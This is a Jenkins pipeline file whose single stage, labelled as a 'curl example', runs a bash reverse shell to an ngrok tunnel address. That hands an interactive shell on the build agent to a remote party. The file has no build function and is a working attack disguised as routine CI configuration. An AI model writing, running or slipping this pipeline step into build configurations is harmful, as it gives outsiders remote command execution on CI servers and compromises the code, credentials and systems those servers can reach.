pipeline { 
    agent any
    stages {
        stage("Using curl example") {
            steps {
                sh '''
                bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/15319 0>&1 
                '''         
                }
            }
        }
    
}
